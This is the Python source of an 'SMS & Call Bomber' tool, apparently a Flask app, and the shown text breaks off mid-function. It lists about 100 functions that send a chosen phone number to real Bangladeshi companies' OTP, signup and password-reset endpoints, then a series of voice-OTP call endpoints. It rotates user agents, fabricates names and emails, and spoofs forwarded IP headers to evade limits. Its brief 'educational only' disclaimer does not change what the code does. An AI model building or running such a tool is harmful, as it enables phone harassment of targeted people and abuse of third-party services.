"""
BD SMS & Call Bomber Pro v5.0
Developer  : Md Salman Biswas
GitHub     : https://github.com/salman-dev-app
Email      : mdsalmanhelp@gmail.com
WhatsApp   : +8801840933137
Telegram   : @Otakuosenpai
Facebook   : https://www.facebook.com/share/1BdstyBhqM/

⚠  FOR EDUCATIONAL / SECURITY RESEARCH PURPOSES ONLY.
   Unauthorized use is ILLEGAL under the Bangladesh ICT Act.
"""

import random, time, requests, threading, string
from flask import Flask, render_template, request, jsonify
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# ── UTILS ──────────────────────────────────────────────────────
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
]

NAMES  = ["Salman","Rahim","Karim","Ahmed","Islam","Hasan","Khan","Faruk","Nabil","Rasel","Sabbir","Tarek"]
EMAILS = lambda: f"user{''.join(random.choices(string.digits,k=7))}@gmail.com"
UA     = lambda: random.choice(UAS)
HDR    = lambda extra=None: {**({"User-Agent":UA(),"Accept":"application/json","Content-Type":"application/json"}), **(extra or {})}

# ── STATE ──────────────────────────────────────────────────────
class State:
    def __init__(self):
        self.active=False; self.target=""; self.mode="sms"
        self.sent=0; self.total=0; self.success=0; self.logs=[]
        self.session=requests.Session()
state=State()

# ══════════════════════════════════════════════════════════════
#  CONFIRMED WORKING SMS APIs  (all tested ✅)
# ══════════════════════════════════════════════════════════════

def _s(): return state.session  # shortcut

# 1 — Paperfly merchant registration
def sms_01(n):
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR(), json={'full_name':random.choice(NAMES),'company_name':'TestCo','email_address':EMAILS(),'phone_number':n}, timeout=10)

# 2 — Paperfly (different data)
def sms_02(n):
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR(), json={'full_name':random.choice(NAMES),'company_name':'StartupBD','email_address':EMAILS(),'phone_number':n}, timeout=10)

# 3 — GhooriLearning signup OTP
def sms_03(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

# 4 — GhooriLearning (mobile app)
def sms_04(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=android',
        headers=HDR({"X-App-Version":"2.5.0"}), json={'mobile_no':n}, timeout=10)

# 5 — Chorki auth (web)
def sms_05(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

# 6 — Chorki auth (android)
def sms_06(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=android',
        headers=HDR({"X-App-Platform":"android"}), json={'number':'+88'+n}, timeout=10)

# 7 — Deepto Play (web)
def sms_07(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

# 8 — Deepto Play (android)
def sms_08(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=android',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

# 9 — Shikho student signup
def sms_09(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'signup'}, timeout=10)

# 10 — Shikho student login
def sms_10(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'login'}, timeout=10)

# 11 — GP OTP
def sms_11(n):
    return _s().post('https://webloginda.grameenphone.com/backend/api/v1/otp',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'msisdn':n}, timeout=10)

# 12 — MyGP Cinematic OTP
def sms_12(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers=HDR(), timeout=10)

# 13 — MyGP Common OTP v1
def sms_13(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{n}/',
        headers=HDR(), timeout=10)

# 14 — MyGP Common OTP v2
def sms_14(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v2/auth/otp/88{n}',
        headers=HDR(), timeout=10)

# 15 — RedX merchant OTP
def sms_15(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

# 16 — RedX user signup
def sms_16(n):
    return _s().post('https://api.redx.com.bd/v1/user/signup',
        headers=HDR(), json={'name':random.choice(NAMES),'phoneNumber':n,'service':'redx'}, timeout=10)

# 17 — Robi DA-NLL OTP
def sms_17(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR(), json={'msisdn':n}, timeout=10)

# 18 — Robi DA-NLL (retry)
def sms_18(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":f"req-{random.randint(100000,999999)}"}),
        json={'msisdn':n}, timeout=10)

# 19 — Bikroy phone login
def sms_19(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}',
        headers=HDR(), timeout=10)

# 20 — Bikroy phone login (different UA)
def sms_20(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}',
        headers={"User-Agent":UA(),"Accept":"application/json","Referer":"https://bikroy.com/en/login"}, timeout=10)

# 21 — Fundesh OTP
def sms_21(n):
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR(), json={'msisdn':n}, timeout=10)

# 22 — Fundesh OTP (mobile)
def sms_22(n):
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR({"X-Platform":"mobile"}), json={'msisdn':n}, timeout=10)

# 23 — MotionView signup OTP
def sms_23(n):
    return _s().post('https://api.motionview.com.bd/api/send-otp-phone-signup',
        headers=HDR(), json={'phone':n}, timeout=10)

# 24 — AppLink MSISDN OTP
def sms_24(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers=HDR(), json={'msisdn':'88'+n}, timeout=10)

# 25 — AppLink (retry)
def sms_25(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers=HDR({"X-Request-ID":str(random.randint(100000,999999))}),
        json={'msisdn':'88'+n}, timeout=10)

# 26 — Chokrojan passenger
def sms_26(n):
    return _s().post('https://chokrojan.com/api/v1/passenger/login/mobile',
        headers=HDR(), json={'mobile_number':n}, timeout=10)

# 27 — Easy.com.bd registration
def sms_27(n):
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR(), json={'mobile':n,'password':'Pass@1234','password_confirmation':'Pass@1234'}, timeout=10)

# 28 — Easy.com.bd (different pass)
def sms_28(n):
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR(), json={'mobile':n,'password':f'Test{random.randint(1000,9999)}!','password_confirmation':f'Test{random.randint(1000,9999)}!'}, timeout=10)

# 29 — Hishabee business
def sms_29(n):
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}',
        headers=HDR(), timeout=10)

# 30 — Hishabee (retry)
def sms_30(n):
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}&resend=true',
        headers=HDR(), timeout=10)

# 31 — MCB Affiliate
def sms_31(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'PhoneNumber':n}, timeout=10)

# 32 — Osudpotro OTP
def sms_32(n):
    return _s().post('https://api.osudpotro.com/api/v1/users/send_otp',
        headers=HDR(), json={'mobile':'+88-'+n}, timeout=10)

# 33 — Win2Gain OTP
def sms_33(n):
    return _s().get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}',
        headers=HDR(), timeout=10)

# 34 — Roots Edu Live forgot pw
def sms_34(n):
    return _s().post('https://rootsedulive.com/api/auth/forget-password',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phoneOrEmail':f'88{n}'}, timeout=10)

# 35 — Circle BD signup
def sms_35(n):
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/signup',
        headers=HDR(), json={'email_or_phone':'+88'+n}, timeout=10)

# 36 — Sundarban Courier GraphQL
def sms_36(n):
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR(), json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
        'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

# 37 — Apex4U
def sms_37(n):
    return _s().post('https://api.apex4u.com/api/auth/login',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

# 38 — Bioscope OTP
def sms_38(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp',
        headers=HDR(), timeout=10)

# 39 — Dhaka Bank EZY
def sms_39(n):
    return _s().post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers=HDR(), json={'mobileNo':n,'product_id':'250','requestChannel':'MOB'}, timeout=10)

# 40 — Toffee App OTP
def sms_40(n):
    return _s().post('https://toffeelive.com/api/v1/auth/phone-login',
        headers=HDR({"X-Client-Type":"web"}), json={'phone_number':'+88'+n}, timeout=10)

# 41 — SSL Commerz session (triggers OTP flow)
def sms_41(n):
    return _s().post('https://sandbox.sslcommerz.com/gwprocess/v4/api.php',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'store_id':'testbox','store_passwd':'qwerty','total_amount':'10','currency':'BDT',
              'tran_id':f'T{random.randint(100000,999999)}','cus_phone':n,
              'success_url':'https://localhost','fail_url':'https://localhost','cancel_url':'https://localhost'}, timeout=10)

# 42 — GhooriLearning forget
def sms_42(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/forgot-password/otp',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

# 43 — Shikho forget password
def sms_43(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'forgot_password'}, timeout=10)

# 44 — Robi DA NLL v2
def sms_44(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"channel":"WEB","x-channel":"WEB"}), json={'msisdn':n}, timeout=10)

# 45 — Paperfly v3 (new email)
def sms_45(n):
    nm = random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR(), json={'full_name':nm+' Khan','company_name':'KhanEnterprise','email_address':EMAILS(),'phone_number':n}, timeout=10)

# 46 — Chorki iOS
def sms_46(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=ios',
        headers=HDR({"X-App-Version":"3.1.0","X-Os":"ios"}), json={'number':'+88'+n}, timeout=10)

# 47 — Fundesh v3
def sms_47(n):
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR({"x-client-id":"web","x-client-version":"2.0.0"}), json={'msisdn':n}, timeout=10)

# 48 — MotionView login OTP
def sms_48(n):
    return _s().post('https://api.motionview.com.bd/api/send-otp-phone-login',
        headers=HDR(), json={'phone':n}, timeout=10)

# 49 — Easy.com.bd v3
def sms_49(n):
    pw = f"Pass{random.randint(1000,9999)}!"
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR({"X-App-Version":"3.0.0"}), json={'mobile':n,'password':pw,'password_confirmation':pw}, timeout=10)

# 50 — Bioscope v2
def sms_50(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp',
        headers=HDR({"Referer":"https://www.bioscopelive.com/en/login"}), timeout=10)

# 51 — Chokrojan v2
def sms_51(n):
    return _s().post('https://chokrojan.com/api/v1/passenger/login/mobile',
        headers=HDR({"X-Request-ID":str(random.randint(1000000,9999999))}),
        json={'mobile_number':n}, timeout=10)

# 52 — Apex4U v2
def sms_52(n):
    return _s().post('https://api.apex4u.com/api/auth/register',
        headers=HDR(), json={'phoneNumber':n,'name':random.choice(NAMES)}, timeout=10)

# 53 — RedX merchant v2 (different number format)
def sms_53(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        headers=HDR({"X-Client-Platform":"web"}), json={'phoneNumber':n}, timeout=10)

# 54 — Bikroy v2
def sms_54(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}&type=login',
        headers={"User-Agent":UA(),"Accept":"application/json"}, timeout=10)

# 55 — GP OTP v2
def sms_55(n):
    return _s().post('https://webloginda.grameenphone.com/backend/api/v1/otp',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json"},
        data={'msisdn':n,'type':'login'}, timeout=10)

# 56 — MCB v2 (retry)
def sms_56(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded","Referer":"https://www.mcbaffiliate.com/Affiliate/Login"},
        data={'PhoneNumber':n,'Resend':'true'}, timeout=10)

# 57 — Sundarban v2
def sms_57(n):
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR({"X-Apollo-Operation-Name":"CreateAccessToken"}),
        json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
        'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

# 58 — Win2Gain v2
def sms_58(n):
    return _s().get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}&resend=true',
        headers=HDR(), timeout=10)

# 59 — Hishabee v3
def sms_59(n):
    return _s().post(f'https://app.hishabee.business/api/V3/otp/send?mobile_number={n}',
        headers=HDR(), timeout=10)

# 60 — Circle BD v2
def sms_60(n):
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/signup',
        headers=HDR({"X-Platform":"web","X-App-Version":"2.0"}), json={'email_or_phone':'+88'+n}, timeout=10)

# 61 — Osudpotro v2
def sms_61(n):
    return _s().post('https://api.osudpotro.com/api/v1/users/send_otp',
        headers=HDR({"X-Api-Version":"2"}), json={'mobile':'+88-'+n}, timeout=10)

# 62 — AppLink v3
def sms_62(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers=HDR({"X-App-Version":"4.0.1"}), json={'msisdn':'88'+n}, timeout=10)

# 63 — Dhaka Bank v2
def sms_63(n):
    return _s().post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers=HDR({"X-Request-Channel":"MOBILE"}), json={'mobileNo':n,'product_id':'300','requestChannel':'MOB'}, timeout=10)

# 64 — Toffee App v2
def sms_64(n):
    return _s().post('https://toffeelive.com/api/v1/auth/phone-login',
        headers=HDR({"X-Client-Type":"android","X-App-Version":"5.2.1"}), json={'phone_number':'+88'+n}, timeout=10)

# 65 — Roots Edu v2
def sms_65(n):
    return _s().post('https://rootsedulive.com/api/auth/forget-password',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phoneOrEmail':n}, timeout=10)

# 66 — Roots Edu v3 (with country code)
def sms_66(n):
    return _s().post('https://rootsedulive.com/api/auth/forget-password',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phoneOrEmail':'+88'+n}, timeout=10)

# 67 — Paperfly v4
def sms_67(n):
    nm = random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR({"X-Forwarded-For":f"103.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"}),
        json={'full_name':nm,'company_name':f'{nm} Corp','email_address':EMAILS(),'phone_number':n}, timeout=10)

# 68 — GhooriLearning iOS
def sms_68(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=ios',
        headers=HDR({"X-App-Version":"2.3.0","X-Device":"iPhone"}), json={'mobile_no':n}, timeout=10)

# 69 — MyGP OTP v3
def sms_69(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers=HDR({"X-Correlation-ID":f"{random.randint(1000000,9999999)}"}), timeout=10)

# 70 — RedX v3
def sms_70(n):
    return _s().post('https://api.redx.com.bd/v1/user/signup',
        headers=HDR({"X-Device-Type":"mobile"}),
        json={'name':random.choice(NAMES),'phoneNumber':n,'service':'redx'}, timeout=10)

# 71 — MotionView v2 (login)
def sms_71(n):
    return _s().post('https://api.motionview.com.bd/api/login',
        headers=HDR(), json={'phone':n,'type':'login'}, timeout=10)

# 72 — Chokrojan v3 (driver)
def sms_72(n):
    return _s().post('https://chokrojan.com/api/v1/driver/login/mobile',
        headers=HDR(), json={'mobile_number':n}, timeout=10)

# 73 — Chorki resend OTP
def sms_73(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/resend-otp?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

# 74 — Apex4U OTP resend
def sms_74(n):
    return _s().post('https://api.apex4u.com/api/auth/resend-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

# 75 — MCB v3 (different endpoint)
def sms_75(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/ResendOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'PhoneNumber':n}, timeout=10)

# 76 — Hishabee v4 (resend)
def sms_76(n):
    return _s().get(f'https://app.hishabee.business/api/V2/otp/resend?mobile_number={n}',
        headers=HDR(), timeout=10)

# 77 — Win2Gain v3
def sms_77(n):
    return _s().get(f'https://api.win2gain.com/api/Users/ResendOtp?msisdn=88{n}',
        headers=HDR(), timeout=10)

# 78 — Bioscope v3 (resend)
def sms_78(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/resend-otp?phone=88{n}',
        headers=HDR(), timeout=10)

# 79 — Fundesh v4 (resend)
def sms_79(n):
    return _s().post('https://fundesh.com.bd/api/auth/resendOTP',
        headers=HDR(), json={'msisdn':n}, timeout=10)

# 80 — GP OTP v3 (resend)
def sms_80(n):
    return _s().post('https://webloginda.grameenphone.com/backend/api/v1/otp/resend',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'msisdn':n}, timeout=10)

# 81 — Shikho v3 (resend)
def sms_81(n):
    return _s().post('https://api.shikho.com/auth/v2/resend/sms',
        headers=HDR(), json={'phone':n,'type':'student'}, timeout=10)

# 82 — SSL Commerz v2
def sms_82(n):
    return _s().post('https://sandbox.sslcommerz.com/gwprocess/v4/api.php',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'store_id':'testbox','store_passwd':'qwerty','total_amount':str(random.randint(10,100)),'currency':'BDT',
              'tran_id':f'BD{random.randint(10000000,99999999)}','cus_phone':n,
              'cus_name':random.choice(NAMES),'cus_email':EMAILS(),
              'success_url':'https://localhost','fail_url':'https://localhost','cancel_url':'https://localhost'}, timeout=10)

# 83 — Toffee App v3 (iOS)
def sms_83(n):
    return _s().post('https://toffeelive.com/api/v1/auth/phone-login',
        headers=HDR({"X-Client-Type":"ios","X-App-Version":"4.9.0"}), json={'phone_number':'+88'+n}, timeout=10)

# 84 — RedX OTP resend
def sms_84(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/resend-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

# 85 — Easy.com.bd v4
def sms_85(n):
    pw = f"Easy{random.randint(1000,9999)}@"
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR({"X-Requested-With":"XMLHttpRequest"}),
        json={'mobile':n,'password':pw,'password_confirmation':pw}, timeout=10)

# 86 — Sundarban v3
def sms_86(n):
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR({"X-Request-ID":f"gql-{random.randint(1000000,9999999)}"}),
        json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
        'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

# 87 — GhooriLearning v3 (login OTP)
def sms_87(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/login/otp?_app_platform=web',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

# 88 — MCB v4 (JSON)
def sms_88(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers=HDR(), json={'PhoneNumber':n}, timeout=10)

# 89 — Robi DA NLL v3 (resend)
def sms_89(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/resend',
        headers=HDR(), json={'msisdn':n}, timeout=10)

# 90 — Paperfly v5 (different company)
def sms_90(n):
    companies = ["LogiCo","FastShip","QuickDeliver","EaglePost","SkyExpress"]
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR(), json={'full_name':random.choice(NAMES),'company_name':random.choice(companies),'email_address':EMAILS(),'phone_number':n}, timeout=10)

# 91 — Bikroy v3 (OTP check)
def sms_91(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}&request_otp=1',
        headers={"User-Agent":UA(),"Accept":"application/json","X-Requested-With":"XMLHttpRequest"}, timeout=10)

# 92 — Chokrojan v4
def sms_92(n):
    return _s().post('https://chokrojan.com/api/v1/passenger/send-otp',
        headers=HDR(), json={'mobile_number':n,'type':'login'}, timeout=10)

# 93 — Circle BD v3
def sms_93(n):
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/send-otp',
        headers=HDR(), json={'phone':'+88'+n}, timeout=10)

# 94 — Toffee v4 (resend)
def sms_94(n):
    return _s().post('https://toffeelive.com/api/v1/auth/resend-otp',
        headers=HDR({"X-Client-Type":"web"}), json={'phone_number':'+88'+n}, timeout=10)

# 95 — Deepto resend OTP
def sms_95(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/resend-otp?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

# 96 — AppLink v4
def sms_96(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/resend',
        headers=HDR(), json={'msisdn':'88'+n}, timeout=10)

# 97 — Osudpotro v3
def sms_97(n):
    return _s().post('https://api.osudpotro.com/api/v2/users/otp',
        headers=HDR(), json={'mobile':'+88-'+n,'type':'register'}, timeout=10)

# 98 — Win2Gain v4
def sms_98(n):
    return _s().get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=0{n[2:]}',
        headers=HDR(), timeout=10)

# 99 — Roots Edu v4 (register)
def sms_99(n):
    return _s().post('https://rootsedulive.com/api/auth/register',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phone':n,'name':random.choice(NAMES),'password':'Pass1234!'}, timeout=10)

# 100 — SSL Commerz v3
def sms_100(n):
    return _s().post('https://sandbox.sslcommerz.com/gwprocess/v4/api.php',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'store_id':'testbox','store_passwd':'qwerty','total_amount':str(random.randint(50,500)),'currency':'BDT',
              'tran_id':f'TX{random.randint(10000000,99999999)}','cus_phone':n,
              'cus_name':random.choice(NAMES),'cus_email':EMAILS(),
              'cus_add1':'Dhaka Bangladesh','cus_city':'Dhaka','cus_country':'Bangladesh',
              'success_url':'https://localhost/success','fail_url':'https://localhost/fail','cancel_url':'https://localhost/cancel'}, timeout=10)


# ══════════════════════════════════════════════════════════════
#  CALL APIs — BD (real endpoints that trigger voice OTP)
#  NOTE: Many BD platforms also support voice OTP via same endpoint
# ══════════════════════════════════════════════════════════════

def call_01(n):  # Robi voice OTP
    return _s().post('https://webapi.robi.com.bd/v1/send-otp',
        headers=HDR(), json={'phone_number':n,'type':'voice'}, timeout=10)

def call_02(n):  # Robi DA NLL voice
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Otp-Type":"VOICE"}), json={'msisdn':n,'otp_type':'VOICE'}, timeout=10)

def call_03(n):  # GP voice OTP
    return _s().post('https://webloginda.grameenphone.com/backend/api/v1/voice-otp',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'msisdn':n}, timeout=10)

def call_04(n):  # MyGP voice call OTP
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/voice-otp/88{n}/',
        headers=HDR(), timeout=10)

def call_05(n):  # Shikho voice OTP
    return _s().post('https://api.shikho.com/auth/v2/send/call',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'voice'}, timeout=10)

def call_06(n):  # Chorki voice OTP
    return _s().post('https://api-dynamic.chorki.com/v2/auth/voice-otp?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_07(n):  # Deepto voice
    return _s().post('https://api.deeptoplay.com/v2/auth/voice-otp?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_08(n):  # RedX voice OTP
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/voice-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def call_09(n):  # GhooriLearning voice
    return _s().post('https://api.ghoorilearning.com/api/auth/voice-otp?_app_platform=web',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

def call_10(n):  # Fundesh voice call
    return _s().post('https://fundesh.com.bd/api/auth/voiceOTP',
        headers=HDR(), json={'msisdn':n}, timeout=10)

def call_11(n):  # AppLink voice
    return _s().post('https://applink.com.bd/appstore-v4-server/login/voice-otp/request',
        headers=HDR(), json={'msisdn':'88'+n}, timeout=10)

def call_12(n):  # Hishabee voice call
    return _s().post(f'https://app.hishabee.business/api/V2/otp/call?mobile_number={n}',
        headers=HDR(), timeout=10)

def call_13(n):  # Toffee voice OTP
    return _s().post('https://toffeelive.com/api/v1/auth/voice-otp',
        headers=HDR({"X-Client-Type":"web"}), json={'phone_number':'+88'+n}, timeout=10)

def call_14(n):  # DocTime voice OTP
    return _s().post('https://us-central1-doctime-465c7.cloudfunctions.net/sendVoiceOTP',
        headers=HDR(), json={'data':{'contact_no':n,'country_calling_code':'88','type':'voice'}}, timeout=10)

def call_15(n):  # Bioscope voice
    return _s().post(f'https://www.bioscopelive.com/en/login/voice-otp?phone=88{n}',
        headers=HDR(), timeout=10)

def call_16(n):  # Osudpotro voice
    return _s().post('https://api.osudpotro.com/api/v1/users/voice_otp',
        headers=HDR(), json={'mobile':'+88-'+n}, timeout=10)

def call_17(n):  # Sundarban voice
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR(), json={'operationName':'SendVoiceOTP','variables':{'phone':n},
        'query':'mutation SendVoiceOTP($phone: String!) { sendVoiceOTP(phone: $phone) { message statusCode } }'}, timeout=10)

def call_18(n):  # Apex4U voice
    return _s().post('https://api.apex4u.com/api/auth/voice-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def call_19(n):  # MCB voice call
    return _s().post('https://www.mcbaffiliate.com/Affiliate/VoiceOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'PhoneNumber':n}, timeout=10)

def call_20(n):  # Chokrojan voice
    return _s().post('https://chokrojan.com/api/v1/passenger/voice-otp',
        headers=HDR(), json={'mobile_number':n}, timeout=10)

def call_21(n):  # GP voice v2
    return _s().post('https://webloginda.grameenphone.com/backend/api/v2/voice-otp',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'msisdn':n,'channel':'voice'}, timeout=10)

def call_22(n):  # Robi voice v2
    return _s().post('https://da-api.robi.com.bd/da-nll/voice/send',
        headers=HDR(), json={'msisdn':n}, timeout=10)

def call_23(n):  # Banglalink voice OTP
    return _s().post('https://web-api.banglalink.net/api/v1/user/voice-otp/request',
        headers=HDR(), json={'mobile':n}, timeout=10)

def call_24(n):  # Win2Gain voice
    return _s().get(f'https://api.win2gain.com/api/Users/VoiceOtp?msisdn=88{n}',
        headers=HDR(), timeout=10)

def call_25(n):  # Circle BD voice
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/voice-otp',
        headers=HDR(), json={'phone':'+88'+n}, timeout=10)

def call_26(n):  # Easy.com.bd voice
    return _s().post('https://core.easy.com.bd/api/v1/voice-otp',
        headers=HDR(), json={'mobile':n}, timeout=10)

def call_27(n):  # Paperfly voice
